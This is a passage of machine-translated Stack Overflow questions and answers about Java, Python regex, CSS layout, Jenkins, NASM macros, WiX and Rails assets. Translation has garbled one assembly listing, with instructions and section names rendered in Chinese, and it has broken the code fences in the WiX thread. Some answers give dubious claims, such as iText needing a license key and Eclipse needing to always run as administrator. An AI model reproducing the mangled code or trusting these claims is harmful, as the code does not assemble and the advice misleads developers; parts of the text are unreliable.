            mExternalStorageAvailable = mExternalStorageWriteable = false;
            }
            String file = null;
            if(mExternalStorageWriteable) {
            file = Environment.getExternalStorageDirectory().getPath() + FILE;
            }

            PdfWriter.getInstance(document,new FileOutputStream(file));
            document.open();
            Paragraph p = new Paragraph("Hello iText World!");
            document.add(p);
            document.close();

            } catch (Exception e) {
            e.printStackTrace();
            }
    }

} 
```

我正在尝试为另一组数据再生成一个，生成的文件大小为 0kb，打开时显示消息“Adobe Reader 无法打开“List.pdf”并键入或因为文件已损坏”。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-07-12T12:47:14.167

iText 需要许可证密钥。检查你的 logcat 是否有异常。访问他们的网站以获取许可证密钥并查看如何实施它。

# java - 如何将 BNode 添加到二叉搜索树？

> ID：15650240
> 
> 赞同：0
> 
> 时间：2013-03-27T01:01:28.577
> 
> 标签：java, binary-tree

从我们的作业中，有一个问题要求我们在 BTree 类中编写一个方法。它必须将整数作为参数，然后将其添加到树中。所以我这样做了：

```
public void add(int v){
    if(root == null){
        root = new BNode(v);
    }
    else{
        add(v, root);
    }
}
public void add(int v, BNode branch){
    if(v == branch.getVal()){
        return;
    }
    if(v<branch.getVal()){
        if(branch.getLeft() == null){
            branch.setLeft(new BNode(v));
        }
        else{
            add(v, branch.getLeft());
        }
    }
    else{
        if(branch.getRight() == null){
            branch.setRight(new BNode(v));
        }
        else{
            add(v, branch.getRight());
        }
    }
} 
```

但是我想知道当方法的参数只是一个 BNode 时如何添加？仅仅是：

```
public void add(BNode b){
    add(BNode.getVal());
} 
```

没有更有效的方法吗？任何帮助，将不胜感激。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-27T01:08:16.950

是的，把你的参数类型换成另一种方式：让你的方法不要期望 a`int`而是 a `BNode`。所以改变这个：

```
public void add(int v, BNode branch) 
```

至

```
public void add(BNode v, BNode branch) 
```

并改变：

```
public void add(int v) 
```

至

```
public void add(BNode v) 
```

然后创建一个不同的方法：

```
public void add(int b){
    add(new BNode(b));
} 
```

这样您就可以避免在内存中创建一个额外的对象。

# iphone - 如何将文档文件夹隐藏到 PhoneView 等 3rd 方应用程序？

> ID：15650243
> 
> 赞同：0
> 
> 时间：2013-03-27T01:01:57.240
> 
> 标签：iphone, ios, objective-c, cocoa-touch

今天我下载了 PhoneView 应用程序的演示版，令我惊讶的是，我能够使用这个 PhoneView 应用程序更改位于 Documents/Library 文件夹中的文件中的内容。

我想限制用户访问我的应用程序中的文件，并想让这些文件对这些 3rd 方工具不可见？有没有办法实现它？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-27T06:13:29.613

无法限制对文件的访问。但是如果你想阻止人们查看文件，你可以加密它们。[这](https://github.com/AlanQuatermain/aqtoolkit)可能会有所帮助（CommonCrypto 部分）。您需要生成一个加密密钥（我认为您可以使用`CFUUIDCreate`它）并将其存储在您应用的钥匙串中。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-27T05:59:08.827

PhoneView 和类似的应用程序可以直接访问 iOS 设备文件系统，这与 iTunes 相同，因此它们能够浏览和修改设备上 iTunes 可访问的所有媒体，包括音乐、视频、应用程序以及它们创建的所有数据。

基本上，您无法阻止他们查看您的应用程序数据，因为他们不尊重任何可见性键，只是列出文件系统中的所有内容。

因此，如果您真的不顾一切地向窥探其设备文件系统内容的用户隐藏您的应用程序数据，您将不得不以某种不可读的格式对所有文件进行编码，这样用户仍然可以更改和删除数据，但无法理解它。

**简短的回答：**您确实无法采取任何措施来防止这种情况发生，我强烈建议您将应用数据保持原样。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-27T08:08:37.123

也许唯一的方法是编码和解码您不喜欢其他人看到的文件。iOS 上的 Documents 文件夹与 OS x 的 Documents 相同，所有应用程序或人都可以阅读。

# python - 在 Python 2.7.3 中使用正则表达式搜索文本并输出匹配项

> ID：15650244
> 
> 赞同：1
> 
> 时间：2013-03-27T01:02:06.523
> 
> 标签：python, regex, text-files

我正在努力完成标题所说的内容。该程序旨在从指定路径读取 .txt 文件并匹配代码中指定的术语。这是我到目前为止所拥有的：

```
import re

source = open("C:\\test.txt", "r")
lines = []

for line in source:
    line = line.strip()
    lines.append(line)
    if re.search('reply', line):
        print 'found: ', line 
```

如您所见，我使用 re.search 指定术语“回复”，但这将我限制为一个术语。我知道有一种方法可以指定要搜索的单词列表或字典，但我的尝试失败了。我认为可以创建一个类似...的列表

```
keywords = ['reply', 'error', 'what'] 
```

...但是尽管我在这个网站上阅读了这些内容，但我似乎无法将其正确地合并到代码中。非常感谢您对此的任何建议或帮助！

PS。如果我想让搜索区分大小写，我可以使用...

```
"(.*)(R|r)eply(.*)" 
```

...在我要查找的术语列表中？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-27T01:08:10.340

单程：

```
import re
source = open("input", "r")
lines = []
keywords = ['reply', 'error', 'what']
# join list with OR, '|', operators
# re.I makes it case-insensitive
exp = re.compile("|".join(keywords), re.I)
for line in source:
    line = line.strip()
    lines.append(line)
    if re.search(exp, line):
        print 'found: ', line 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-27T01:55:10.987

使用 re.search()，你传递一个字符串，但你可以指定相当复杂的模式。[请参阅Python re 模块](http://docs.python.org/2/library/re.html)上的文档，其中有一个关于“正则表达式语法”的部分。

事实上，你的问题有答案......`"R|r"`搜索“R”或“r”，因此`"reply|error|what"`搜索“回复”、“错误”或“什么”。

> PS。如果我想让搜索区分大小写，我可以使用...“ `(.*)(R|r)eply(.*)`”

不需要这个`.*`位（它可能会使你的代码变慢）。re.search() 函数在字符串 中的*任何位置*查找匹配项。`(R|r)eply`将寻找“回复”或“回复”，它不会匹配“回复”或“回复”。

如果你想要一个不区分大小写的搜索，有一个`flags=re.IGNORECASE`选项可以传递给`re.search()`. 例如：

```
re.search('reply', line, flags=re.IGNORECASE) 
```

# jquery - 以图形方式将主要导航栏与次要导航栏链接起来

> ID：15650250
> 
> 赞同：0
> 
> 时间：2013-03-27T01:04:16.640
> 
> 标签：jquery, html, css

我正在尝试建立一个响应式网站。我处于第一阶段，根据“内容优先”的方法论，我必须考虑最小的移动布局。主页（正在建设中）是这样的：

![我的主页](../Images/3236102311ce7f9abe1852ca1ae86d95.png)

例如，当用户单击第一个图标时，主导航栏下方会出现一个辅助导航栏。看这张图（不要看图标，图片是随机的和临时的）：

![带有辅助导航栏的主页](../Images/9f08160e787c9a9d0d3deb757e0de0e9.png)

我想以某种方式以图形方式链接两个栏。我不知道，也许像这些例子中的图像：

![条之间的链接示例](../Images/109906056892a967e772267a04bf82e5.png) ![条间链接的例子2](../Images/5847d8b8256e8997f4b7f1d52d9b84b4.png)

这是做这件事的正确方法吗？而且，在这是一个很好的做法的情况下，如何以独立于屏幕宽度的方式定位“链接图像”？该位置必须基于其他元素的位置，或者可能基于百分比。它不能基于绝对定位。在这种情况下，确实，调整屏幕大小会弄得一团糟，如下图所示：

![调整大小弄得一团糟](../Images/1bd2066e605ac583695eaad9b8950367.png)

这是我的带有一些 jQuery 的 html 页面：

```
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN"
   "http://www.w3.org/TR/html4/strict.dtd">
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
<title>Responsive Site</title>
<link rel="stylesheet" type="text/css" href="css/reset.css">
<link rel="stylesheet" type="text/css" href="css/princstyle.css">

<script type="text/javascript" src="js/jquery-1.9.1.min.js"></script>
<script>
$(document).ready(function(){
  <!-- hide the secondary navigation bar -->
  $("#socialnav").hide();

  $("#social-icon").click(
    function(){
        $("#socialnav").toggle();
    })
});
</script>

</head>

<body>
    <!-- header -->
    <div class="big">
        <h1 class="big-font">
            Responsive Website
        </h1>
        <h2 class="medium-font">
            trytrytrytrytry
        </h2>
        <ul id="generalnav" class="nav big centered-content dark-background">
            <li><img id="social-icon" alt="social_icon" src="img/social.png"></li><!--
            --><li><img alt="sections_icon" src="img/sections.png"></li><!--
            --><li><img alt="javascript_section_icon" src="img/javascripticon.png"></li>
        </ul>

        <ul id="socialnav" class="nav big centered-content dark-background">
            <li><img alt="social_icon" src="img/social.png"></li><!--
            --><li><img alt="sections_icon" src="img/sections.png"></li><!--
            --><li><img alt="javascript_section_icon" src="img/javascripticon.png"></li>
        </ul>

    </div>
</body>
</html> 
```

感谢你们对我的帮助！这是我的[jsFiddle](http://jsfiddle.net/jxqk4/)（唯一有效（切换）的图标是左边的那个）。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-27T01:51:12.897

首先，您应该嵌套列表，因为第二个是第一个的孩子。

```
 <ul id="generalnav" class="nav big centered-content dark-background">
        <li><img id="social-icon" alt="social_icon" src="img/social.png">
            <ul id="socialnav" class="nav big centered-content dark-background">
                <li><img alt="social_icon" src="img/social.png"></li>
                <li><img alt="sections_icon" src="img/sections.png"></li>
                <li><img alt="javascript_section_icon" src="img/javascripticon.png"></li>
        </ul></li>
        <li><img alt="sections_icon" src="img/sections.png"></li>
        <li><img alt="javascript_section_icon" src="img/javascripticon.png"></li>
    </ul> 
```

然后您可以执行以下操作：（您不需要任何 Javascript。）

```
 #generalnav li ul { display:none; }
    #generalnav li:hover ul { display:block; } 
```

这也允许您对链接图像使用相对定位。

# java - 静态块永远不会运行

> ID：15650256
> 
> 赞同：0
> 
> 时间：2013-03-27T01:05:29.597
> 
> 标签：java, static

我有一个看起来像这样的实用程序类：

```
public final class MyUtils {

     public static final List<String> MY_VALUES = new ArrayList<String>();

     {
         MY_VALUES.add("foo");
         MY_VALUES.add("bar");
     }
} 
```

我从另一个类中调用它，就像这样：

```
MyUtils.MY_VALUES 
```

如果我这样做，列表是空的，如果我调试，我会看到静态块永远不会运行。

[正如我从静态类初始化何时发生](https://stackoverflow.com/questions/3499214/java-static-class-initialization)的答案中了解到的那样？以及[如何强制初始化一个类？](https://stackoverflow.com/questions/3560103/best-way-to-force-a-java-class-to-be-loaded)块应该在 when 运行`a static field of the class is assigned`，我马上就这样做。我还尝试使变量成为非最终变量以满足条件“ `a non-constant static field is used`”。

我可以使用 init 方法，这在其他两个问题和[为什么我的静态代码块不执行？](https://stackoverflow.com/questions/15509337/why-doesnt-my-static-block-of-code-execute)但是我仍然想了解为什么它一开始就不起作用，尽管我似乎已经满足了语言规范中的条件。

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2013-03-27T01:07:57.503

您必须`static`在块前面添加关键字才能使其成为静态：

```
public final class MyUtils {

     public static final List<String> MY_VALUES = new ArrayList<String>();

     static {
         MY_VALUES.add("foo");
         MY_VALUES.add("bar");
     }
} 
```

每次构造类时都会调用一个**初始化块。**

静态**初始化块**仅在程序开始时调用一次。

# eclipse-plugin - Eclipse 颜色主题：“颜色主题”未显示

> ID：15650258
> 
> 赞同：4
> 
> 时间：2013-03-27T01:05:35.597
> 
> 标签：eclipse-plugin, color-scheme

我正在尝试改变我的工作方式，以便在坐在电脑前 8 小时后不会感到头疼，所以我想在 Eclipse 中使用颜色来看看它是否有帮助。

我听说过这个 Eclipse Color Theme 插件的好评。

我通过 Eclipse Marketplace 安装，我将 .xml 文件主题放入硬盘驱动器上 eclipse 目录中的“dropins”目录中，选择 window->prefrences->general->apperence->??? “颜色主题”在哪里？它只是不存在！

有谁知道可能是什么问题？我正在使用另一个插件 EGit 运行 Eclipse Juno EE。

手动安装？我现在已经两次重新安装了 Color Theme 插件！

**[解决方案] 我刚刚从另一个帖子的帮助中发现了问题。我没有以管理员身份运行，因为我的 Program Files 目录受到保护。答：始终以管理员身份或在 Linux 系统 SUDO 上运行 Eclipse。由于缺乏权限，我的文件没有安装。**

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2014-07-20T18:04:00.743

帮助->安装新软件->添加

名称：颜色主题

位置：[http ://eclipse-color-theme.github.com/update](http://eclipse-color-theme.github.com/update)

安装后，将在菜单中显示选项。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-03-27T07:33:15.987

不，正确的答案是在一个可以写入的位置解压缩 eclipse，即使没有 root/admin 访问权限。不要将 Eclipse 放入“程序文件”文件夹中。

从历史上看，eclipse 被设计为能够就地修改自身，当您的安装无法做到这一点并且您没有通过 eclipse.ini 设置将其指向可写配置区域时，您将不时遇到麻烦.

# mysql - MySQL leftjoin 和 ORDER

> ID：15650264
> 
> 赞同：0
> 
> 时间：2013-03-27T01:06:08.043
> 
> 标签：mysql, sql, join, left-join

我遇到了一个 mySQL 查询的问题。

我想`credit_memo`从表中返回每个最后的汇率交换`HISTORIQUE_DEVISE`。

我的`HISTORIQUE_DEVISE`表记录如下：

```
ID  |  account_id|  code_source  |  code_destination |  date      |   taux     | ..
242 |         12 |             1 |               133 | 2013-02-22 |    0.82000 | ..
243 |         12 |             1 |               133 | 2013-03-26 |    0.96000 | ..
244 |         12 |             1 |               133 | 2013-03-26 |    1.29000 | .. 
```

目前，我的最后一个左连接返回 3 行（如果`credit_memo.date`等于`2013-03-26`和`rate.taux`SELECT 中的返回`0.82000`。如何转换查询以获得`1.29000`左连接的最后一个值？因为我只想要最后一条记录 #244。是可以避免左连接内的子查询吗？

谢谢你们的帮助！

```
SELECT credit_memo.code_avoir_client, 
       credit_memo.total_ttc, 
       credit_memo.date, 
       credit_memo.code_utilisateur, 
       credit_memo.montant_restant_a_payer, 
       DEVISE.code_iso, 
       PAIEMENT_FACTURE_FOURNISSEUR.date_reglement, 
       customer.code_client, 
       customer.code_utilisateur_client, 
       customer.prenom, 
       customer.raison_social, 
       lead.code_client, 
       lead.code_utilisateur_client, 
       lead.prenom, 
       lead.raison_social, 
       project.project_code, 
       project.name,  
       rate.taux
FROM AVOIR_CLIENT AS credit_memo
       LEFT JOIN CLIENT AS customer 
              ON customer.code_client = credit_memo.code_client 
                 AND customer.code_profil_client = 1 
                 AND ( customer.account_id = 0 
                        OR customer.account_id = 12 ) 
                 AND customer.etat = 0 
       LEFT JOIN CLIENT AS lead 
              ON lead.code_client = credit_memo.code_client 
                 AND lead.code_profil_client = 2 
                 AND ( lead.account_id = 0 
                        OR lead.account_id = 12 ) 
                 AND lead.etat = 0 
       LEFT JOIN PROJECT AS project 
              ON project.project_code = credit_memo.project_code 
                 AND ( project.account_id = 0 
                        OR project.account_id = 12 ) 
                 AND project.etat = 0 
       LEFT JOIN DEVISE 
              ON DEVISE.code_devise = credit_memo.code_devise 
                 AND ( DEVISE.account_id = 0 
                        OR DEVISE.account_id = 12 ) 
                 AND DEVISE.etat = 0 
       LEFT JOIN PAIEMENT_FACTURE_FOURNISSEUR 
              ON PAIEMENT_FACTURE_FOURNISSEUR.code_avoir_client = 
                 credit_memo.code_avoir_client 
                 AND ( PAIEMENT_FACTURE_FOURNISSEUR.account_id = 0 
                        OR PAIEMENT_FACTURE_FOURNISSEUR.account_id = 12 ) 
                 AND PAIEMENT_FACTURE_FOURNISSEUR.etat = 0
       LEFT JOIN ETABLISSEMENT AS eta
              ON eta.code_etablissement = 
                 credit_memo.code_etablissement 
                 AND ( eta.account_id = 0 
                        OR eta.account_id = 12 )
       LEFT JOIN HISTORIQUE_DEVISE AS rate
              ON rate.code_etablissement = 
                 credit_memo.code_etablissement 
                 AND rate.CODE_DEVISE_SOURCE = credit_memo.CODE_DEVISE
                 AND rate.CODE_DEVISE_DESTINATION = eta.CODE_DEVISE
                 AND rate.date <= credit_memo.date
                 AND ( rate.account_id = 0 
                        OR rate.account_id = 12 )
                 AND rate.etat = 0
WHERE  ( credit_memo.account_id = 0 
          OR credit_memo.account_id = 12 ) 
       AND credit_memo.etat = 0 
GROUP BY credit_memo.code_avoir_client ; 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-27T03:08:13.433

您可以通过添加过滤掉它们的 where 子句来消除其他行。您的 SQL 对我来说在没有更多知识的情况下理解起来有点复杂，但总的来说 where 子句会是这样的：

```
AND NOT EXISTS 
(Select * 
 From HISTORIQUE_DEVISE rate_2 
 WHERE rate.accoun_id=rate_2.accountid 
    ... add other keys fields here if they need to be equal ...
   AND rate_2.ID > rate.ID
) 
```

换句话说，忽略在 HISTRIQUE_DEVISE 中找到“匹配记录”但 ID 更高的记录

# java - 詹金斯工作失败

> ID：15650265
> 
> 赞同：0
> 
> 时间：2013-03-27T01:06:24.380
> 
> 标签：java, jenkins

我有一个 .Jar 文件，它只会在运行时将数据加载到数据库中。我已计划通过 Jenkins 运行这项工作。当我在 Jenkins 中执行作业时，它会成功运行 .JAR。但是，如果作业中存在空指针异常并且它没有成功完成。即便如此，詹金斯说这项工作已经“通过”。如果在作业执行过程中出现问题，我如何使作业失败？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-27T01:51:05.867

@Corey 的解决方案很好。如果你不想写一个 JUnit 测试并在 Jenkins 中支持它，你可以做他之前提到的：捕捉空指针异常（真的，只需要在你的应用程序中有一个顶级捕捉），并且调用 API 退出并返回代码：

```
try {
    myCode.call();
catch (Exception e) {
    System.out.println("An exception was caught at the top level:" + e);
    System.exit(-1);
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-27T01:29:59.477

上次我遇到这个问题时，我决定采取不同的策略并将程序调用更改为 junit 测试。詹金斯当时很高兴。

```
Steps I took:
1\. create an empty (maven) project
2\. added a single java class SmokeTest.java
3\. Added test that called the method I was testing via a script
4\. Create a (maven) Jenkins job to run the project 
```

我的测试内容：

```
public class SmokeTest
{
    private static final String OK = "OK"; //$NON-NLS-1$

    @Test
    public void test()
    {
        // Create a new instance of the Firefox driver
        final WebDriver driver = new HtmlUnitDriver();

        final String url = PropertyManager.getInstance().getString(PropertyManager.SMOKE_TEST_URL_BASE) + "smoke/smoketest"; //$NON-NLS-1$
        AuditLog.registerEvent("Smoke test url is: " + url, this.getClass(), AuditLog.INFO); //$NON-NLS-1$
        driver.get(url);

        // Find the text element by its id
        final WebElement databaseElement = driver.findElement(By.id("database")); //$NON-NLS-1$

        final String databaseResult = databaseElement.getText();
        Assert.assertEquals(SmokeTest.OK, databaseResult);

        //Close the browser
        driver.quit();
    }
} 
```

这里最重要的部分是“Assert.assertEquals”行。这样做的结果是 jUnit 和 jenkins 拾取的

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-03-27T01:51:26.990

如果退出代码不为零，则 Jenkins 作业将失败。

```
System.exit(1); 
```

应该工作（或失败，更准确地说:-)

# glsl - 如何使大矩阵相乘

> ID：15650274
> 
> 赞同：1
> 
> 时间：2013-03-27T01:07:29.290
> 
> 标签：glsl

我正在尝试制作一个将 90x10 矩阵与 10x1 矩阵相乘的 GLSL 着色器。90x1 结果对应于 30 个顶点的 xyz 值。第一个大矩阵仅在启动时加载。另一方面，另一个矩阵可以在每次渲染时改变。

怎么可能做到这一点？我猜第一个矩阵可以存储为纹理，但我不知道如何处理第二个。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-27T13:41:53.940

只需将第二个矩阵作为一个统一的浮点数组传递。

```
uniform float vec10[10]; 
```

并逐个元素地执行乘法运算。

请注意，如果这太慢，您可以尝试以这样的方式打包您的大纹理，以便您可以使用单个 texelfetch 读取 4 个元素。

如果您想查看绑定统一数组的语法，请参阅[http://www.opengl.org/wiki/Uniform_(GLSL)](http://www.opengl.org/wiki/Uniform_(GLSL))。

请注意，将第二个矩阵存储在纹理中也是完全合法的；我只是不确定这样做与作为制服发送相比对性能的影响。但是先让它工作，然后再进行分析和优化。

# assembly - Nasm：使用预处理器将整数转换为字符串

> ID：15650276
> 
> 赞同：1
> 
> 时间：2013-03-27T01:07:39.827
> 
> 标签：assembly, preprocessor, nasm

如何使用 Nasm 预处理器将整数转换为字符串？例如，考虑以下代码：

```
%define myInt 65
%define myString 'Sixty-five is ', myInt 
```

该符号`myString`将评估为`Sixty-five is A`。想要的结果是`Sixty-five is 65`。我怎样才能做到这一点？这似乎是一个微不足道的问题，但 Nasm 文档却一无所获。谢谢！

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-27T01:50:38.520

这段代码

```
%define myInt 65
%define quot "
%define stringify(x) quot %+ x %+ quot
%strcat myString 'Sixty-five is ', stringify(myInt)

bits 32
db myString 
```

生成以下列表文件：

```
 1                                  %define myInt 65
 2                                  %define quot "
 3                                  %define stringify(x) quot %+ x %+ quot
 4                                  %strcat myString 'Sixty-five is ', stringify(myInt)
 5                                  
 6                                  bits 32
 7 00000000 53697874792D666976-     db myString
 8 00000009 65206973203635 
```

和以下二进制文件：

```
0000000000: 53 69 78 74 79 2D 66 69 │ 76 65 20 69 73 20 36 35  Sixty-five is 65 
```

我使用了 2012 年 3 月 12 日编译的 NASM 版本 2.10。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2021-12-24T11:03:29.493

您应该使用 %defstr 宏。

```
%define myInt 65
%defstr strInt myInt
%define myString 'Sixty-five is ', strInt 
```

[https://www.nasm.us/xdoc/2.15.05/html/nasmdoc4.html#section-4.1.9](https://www.nasm.us/xdoc/2.15.05/html/nasmdoc4.html#section-4.1.9)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-27T01:45:12.870

目前无法使用 NASM 进行测试，但这至少在 YASM 中有效（我添加了 Linux x86-64 打印代码以使测试更容易）：

```
[位 64]

% 定义 myInt 65
%define myTens myInt/10 + 48
%define myOnes myInt-(myInt/10)*10 + 48
%define myString '六十五是', myTens, myOnes

部分 .text
全局_start

_开始：
    移动编辑，1；标准输出        
    mov rsi,my_string
    mov edx,my_string_length ; 字符串的长度（以字节为单位）。
    移动 eax,1 ; 写
    系统调用

    xor edi,edi
    移动 eax,60 ; 出口
    系统调用

节 .data
我的字符串数据库我的字符串
数据库 0x0a
my_string_length equ $-my_string

```

# css - DIV 顺序和 Z-Index

> ID：15650277
> 
> 赞同：0
> 
> 时间：2013-03-27T01:07:48.193
> 
> 标签：css, background, z-index

我刚刚找到了一种完美的方式来以我想要的方式显示我的摄影网站的背景图像。（通过搜索stackoverflow帖子）

我取出了我之前在代码中的内容，并用我发现的内容进行了一些小的编辑来替换它。但是，现在菜单或其他任何东西都不能正常工作。

前任。我页面顶部的链接无法点击。

我认为背景覆盖了整个页面，这就是原因。我尝试从我的代码中删除“背景”DIV，并且一切都再次正常工作，但背景图像不再是位置并且使用了我想要的方式。

我认为它与 Z-Index 有关。有人可以帮我解决这个问题吗？并告诉我为什么会这样，这样我就可以避免在代码中做进一步的事情。

这是 JsFiddle（便于查看/编辑） [http://jsfiddle.net/3kke4/](http://jsfiddle.net/3kke4/)

```
body, html{
    font-size:11px;
    font-family:Verdana,Helvetica,Arial,sans-serif;
    margin  : 0px;
    padding : 0px;}

#background{
    position    : absolute;
    top         : 0px;
    left        : 0px;
    overflow    : hidden;
    width       : 100%;
    height      : 100%;
    font-weight : bold;
    font-size   : 30px;}

.cover{
    position : absolute;
    width    : 100%;
    top      : 0px;
    z-index  : -1;} 

#container{
    display:block;
    clear:both;
    text-align: center;
    padding-top:40px;
}
.thumb{
    text-align:left;
    display:inline-block;
    margin:5px;
    padding:10px;
    background-color:rgba(102,102,102,0.5);}

#menu{
    top:0;
    left:0;
    margin:0;
    padding:0;}

#menu ul{
    list-style-type:none;
    left:0;
    right:0;
    position:absolute;
    display:block;
    height:33px;
    margin:0;
    padding:0;
    top:0;
    left:0;}

#menu li{
    display:block;
    float:left;
    margin:0;
    padding:0;}

#menu li a{
    float:left;
    color:#A79787;
    text-decoration:none;
    height:24px;
    padding:9px 15px 0;
    font-weight:normal;}

#menu li a:hover{
    color:#fff;
    background-color:rgba(102,102,102,0.5);
    text-decoration:none;}

#toggle a{
    float:right;
    color:#A79787;
    text-decoration:none;
    height:24px;
    padding:9px 15px 0;
    font-weight:normal;}

#toggle a:hover{
    color:#fff;
    background-color:rgba(102,102,102,0.5);
    text-decoration:none;}

<body>
<div id='background'>
    <img src='http://i.imgur.com/9dOAPlS.jpg' class='cover'/>
</div>
<div id='navigation'>
    <div>
    <ul id='menu'>
        <li><a href='#'>Home</a></li>
        <li><a href='#'>Albums</a></li>
        <li><a href='#'>Contact</a></li>
    </ul>
    </div>
    <div id='toggle'>
        <a href='#'>Hide All</a>
    </div>       
</div>
<div id='container'>

</div>

</body> 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-27T01:14:14.313

修改以下样式（我已将您的`z-index`from`.cover`移至`#background`）：

```
#background{
    position    : absolute;
    top         : 0px;
    left        : 0px;
    overflow    : hidden;
    width       : 100%;
    height      : 100%;
    font-weight : bold;
    font-size   : 30px;
    z-index : -1;}

.cover{
    position : absolute;
    width    : 100%;
    top      : 0px;} 
```

当某物被定位时`absolute`，它就位于其他元素之上。因此，在您的情况下，您试图通过将`z-index`on来抵消这一点`.cover`。这不起作用，因为`.cover`它是 的孩子`#background`，因此它`z-index`是相对于`#background`（它已经位于其他一切之上）。

# javascript - 如何设置固定位置元素高度到达浏览器窗口底部？

> ID：15650278
> 
> 赞同：3
> 
> 时间：2013-03-27T01:07:48.483
> 
> 标签：javascript, jquery, html, css, css-position

我有一个顶部有标题的页面，左侧有一个侧边栏，右侧有一个主要内容区域。[在http://jsbin.com/iqibew/3](http://jsbin.com/iqibew/3)可以看到一个简化的版本。

侧边栏具有样式`position: fixed`，因此它不会随着页面的其余部分滚动。这可行，但如果内容太长而无法容纳，我还需要侧边栏本身滚动。

只有当我可以为侧边栏设置正确的高度时，这才有可能。但我找不到任何方法来设置这个高度。100% 已接近，但它太高了，因为边栏从标题下方开始。

有没有办法解决这个问题。我对 CSS 或 JavaScript/jQuery 解决方案持开放态度。

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2013-03-27T01:40:17.590

我想我会发布这个，因为它似乎有效：

```
div#header-div {
    height: 90px;
    background-color: lime;
    margin: 0;
}
div#fixed-div {
    position: fixed;
    left: 0;
    top: 0;            /* <<< No offset */
    bottom: 0;         /* <<< Pull to the bottom for height */
    margin: 120px 0 0; /* <<< Give it the 120px top */
    width: 260px;
    background-color: silver;
    overflow-y: scroll;
} 
```

[http://jsbin.com/iqibew/13/](http://jsbin.com/iqibew/13/)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-27T01:34:56.580

如果您希望您的 div 大小随心所欲，我可以为您选择

//将此添加到`<head>`部分，我以为您在示例中没有

```
<script src="http://ajax.googleapis.com/ajax/libs/jquery/1.3/jquery.min.js" type="text/javascript"  >
</script>

      <script type="text/javascript"  >
$(document).ready(function() {

function _resizeTDiv()
{
   var p = $("#header-div");
   var position = p.position();
   var realheight = p.position().top+p.height();
 $("#fixed-div").height( $(document).height()-realheight -5); //+-5 Error? , not needed
}
 _resizeTDiv();

//Resize  our div on window resize?
$(window).resize(function() {
 _resizeTDiv();
});

});

</script> 
```

# xml - wix XmlConfig：是否可以在父节点内的特定位置插入新节点

> ID：15650284
> 
> 赞同：2
> 
> 时间：2013-03-27T01:08:14.360
> 
> 标签：xml, xpath, wix

我正在研究的是是否可以使用 util:XmlConfig（或 wix 工具箱中的任何东西）以允许我在安装节点时在其父节点内的特定位置创建节点。这是一个例子：

 `````
...
<parentNode parentAttr1="parent attr1 value">
    <childNode childAttr1="child1 attr1 value" />
    <childNode childAttr1="child2 attr1 value" />
</parentNode>
... 
````  `我想在两个孩子之间插入一个新节点，结果是这样的：

 `````
...
<parentNode parentAttr1="parent attr1 value">
    <childNode childAttr1="child1 attr1 value" />
    <childNode childAttr1="child3 attr1 value" />
    <childNode childAttr1="child2 attr1 value" />
</parentNode>
... 
````  `到目前为止，我的代码会将新节点作为 parentNode 的最后一个子节点，如下所示：

 `````
...
<util:XmlConfig
    Id="MY_ID"
    File="[PROPERTY_SQLRSPATH]ReportServer\rssrvpolicy.config"
    Action="create"
    On="install"
    ElementPath="//parentNode"
    Node="document"
    Sequence="1">
    <![CDATA[
        <childNode childAttr1="child3 attr1 value" />
]]>
</util:XmlConfig>
... 
````  `所以，简而言之。非常感谢您对此的任何帮助！

编辑：这个主题的另一个皱纹将被赋予这种结构：

 `````
...
<parentNode parentAttr1="parent attr1 value">
    <Abc anAttr="a value" />
    <Def someAttr="some value" />
</parentNode>
... 
```` 

`有没有办法在当前子元素之间插入另一个兄弟元素，使最终结构看起来像这样？`

 ``````
...
<parentNode parentAttr1="parent attr1 value">
    <Abc anAttr="a value" />
    <Ghi YaAttr="yet another value" />
    <Def someAttr="some value" />
</parentNode>
... 
````  `* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-05-13T22:54:09.097

我发现没有办法通过 wix 工具来做到这一点。我必须添加一个自定义操作，将元素放置在我想要的位置，然后让安装程序添加我想要的详细信息。不是我认为很好，但现在可以使用，并且卸载也可以使用它，尽管它会保留空元素。``````````

# javascript - Rails 应用找不到我的 Gem 的 javascript

> ID：15650287
> 
> 赞同：1
> 
> 时间：2013-03-27T01:08:19.967
> 
> 标签：javascript, ruby-on-rails, gem, asset-pipeline, sprockets

我编写了一个[gem](https://github.com/jnwelzel/slide-down-alerts-rails)并将其安装在我的 Rails 应用程序中，包括应用程序内的以下[配置](https://gist.github.com/jnwelzel/5250456)。问题是 Rails 应用程序找不到 Gem 的 Javascript 文件，并且 Sprockets 给了我诸如“Sprockets::FileNotFound”之类的错误。关于我在这里做错了什么的任何线索？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-07-05T21:27:30.510

您的 gem 必须包含一个继承自`Rails::Engine`Sprockets 的引擎类，以将其包含在其扫描路径中。请参阅[http://guides.rubyonrails.org/asset_pipeline.html#adding-assets-to-your-gems](http://guides.rubyonrails.org/asset_pipeline.html#adding-assets-to-your-gems)

# javascript - 如何在移动设备和桌面上使用媒体查询？

> ID：15650292
> 
> 赞同：0
> 
> 时间：2013-03-27T01:08:33.227
> 
> 标签：javascript, jquery, css, jquery-mobile

